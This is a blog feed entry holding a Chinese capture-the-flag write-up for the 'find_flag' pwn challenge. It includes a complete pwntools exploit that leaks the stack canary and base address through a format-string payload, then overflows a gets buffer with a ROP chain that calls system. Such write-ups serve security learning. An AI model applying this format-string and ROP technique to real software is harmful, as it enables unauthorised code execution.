{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"格式化字符串漏洞\" tag",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "https://yhuanhuan01.github.io",
    "items": [
        {
            "id": "https://yhuanhuan01.github.io/2023/08/02/find-flag/",
            "url": "https://yhuanhuan01.github.io/2023/08/02/find-flag/",
            "title": "find_flag",
            "date_published": "2023-08-02T10:44:10.000Z",
            "content_html": "<h1 id=\"题目复现深育杯-2021find_flag\"><a class=\"markdownIt-Anchor\" href=\"#题目复现深育杯-2021find_flag\">#</a> 题目复现 ——[深育杯 2021] find_flag</h1>\n<p>pie 与 canary 同时开启，并且有格式化字符串。</p>\n<h3 id=\"检查程序\"><a class=\"markdownIt-Anchor\" href=\"#检查程序\">#</a> 检查程序：</h3>\n<p><img data-src=\"/img/find_flag/image-20230609204936112.png\" alt=\"image-20230609204936112\"></p>\n<p>保护很全面。</p>\n<p><img data-src=\"/img/find_flag/image-20230609205227082.png\" alt=\"image-20230609205227082\"></p>\n<p>可以看的出，在第一处有格式化字符串漏洞。</p>\n<h3 id=\"ida分析\"><a class=\"markdownIt-Anchor\" href=\"#ida分析\">#</a> IDA 分析：</h3>\n<p><img data-src=\"/img/find_flag/image-20230609205448884.png\" alt=\"image-20230609205448884\"></p>\n<p>看了一下 mian 函数，将函数重命名，pwn 是我们有漏洞的地方。</p>\n<p><img data-src=\"/img/find_flag/image-20230609205602697.png\" alt=\"image-20230609205602697\"></p>\n<p>可以看到 gets 函数可以进行栈溢出，但是有 canary 保护，所以我们需要泄露 canary，可以利用格式化字符串去泄露 canary 并覆写在栈上。</p>\n<p><img data-src=\"/img/find_flag/image-20230609205729803.png\" alt=\"image-20230609205729803\"></p>\n<p>发现 backdoor。但是开了 pie，我们应该无法利用后们，但是好在<strong>只读变量（const 修饰的）和字符串变量</strong>放入<strong> rodata</strong> 区。还是可以利用的。</p>\n<h3 id=\"gdb分析\"><a class=\"markdownIt-Anchor\" href=\"#gdb分析\">#</a> gdb 分析:</h3>\n<p>打断点在 printf 处（不知到为什么不能在 main 函数处大不了断点，很奇怪</p>\n<p><img data-src=\"/img/find_flag/image-20230609210601700.png\" alt=\"image-20230609210601700\"></p>\n<p>一直步到下图处</p>\n<p><img data-src=\"/img/find_flag/image-20230609210758887.png\" alt=\"image-20230609210758887\"></p>\n<p>看栈信息，很明显能看到 canary——&gt;</p>\n<blockquote>\n<p>0b:0058│             0x7fffffffdd18 ◂— 0x121203e586d31600</p>\n</blockquote>\n<p><img data-src=\"/img/find_flag/image-20230609210832637.png\" alt=\"image-20230609210832637\"></p>\n<p>看一下距格式化字符串的偏移。</p>\n<p><img data-src=\"/img/find_flag/image-20230609211002101.png\" alt=\"image-20230609211002101\"></p>\n<p>但是难点不是在泄露 canary，而是在泄露基址上去，需要了解 pie 和栈，可以看到，在 rbp 下面刚好有一个我们能泄露函数基址，但是为什么是他呢？</p>\n<p>考虑因为这个地址代表了我们的 main 函数结尾的一个部分的地址，我们可以通过这个地址进而计算出栈的基址。</p>\n<p><img data-src=\"/img/find_flag/image-20230609211705133.png\" alt=\"image-20230609211705133\"></p>\n<p>接下来就是确定偏移了（须注意的一点就是需要在 gets 函数输入后，在查看栈的情况，这样更好确定。</p>\n<p><img data-src=\"/img/find_flag/image-20230609211905134.png\" alt=\"image-20230609211905134\"></p>\n<h3 id=\"exp构造环节\"><a class=\"markdownIt-Anchor\" href=\"#exp构造环节\">#</a> exp 构造环节:</h3>\n<p>既然我们找到了，我们就构造 payload1 去泄露 canary 和基址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>paylaod1 <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p---%19$p'</span></pre></td></tr></table></figure><p>在构造 rop 链的准备。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Base <span class=\"token operator\">=</span> base <span class=\"token operator\">-</span> <span class=\"token number\">0x146F</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>system <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>catflag <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x2004</span> <span class=\"token comment\"># robata 中的字符串</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#ROPgadget --binary file --only 'pop|ret'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rdi <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x14E3</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ret <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x101A</span></pre></td></tr></table></figure><h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp：</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> local<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tp <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'ff'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tp <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.anna.nssctf.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28068</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ff'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name? '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p---%19$p'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'you, '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'---'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>base <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>Base <span class=\"token operator\">=</span> base <span class=\"token operator\">-</span> <span class=\"token number\">0x146F</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>system <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>catflag <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x2004</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#ropgadget</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>rdi <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x14E3</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>ret <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x101A</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x38</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'else? '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"结果\"><a class=\"markdownIt-Anchor\" href=\"#结果\">#</a> 结果：</h3>\n<p><img data-src=\"/img/find_flag/image-20230609212855635.png\" alt=\"image-20230609212855635\"></p>\n",
            "tags": [
                "pie",
                "canary",
                "格式化字符串漏洞"
            ]
        }
    ]
}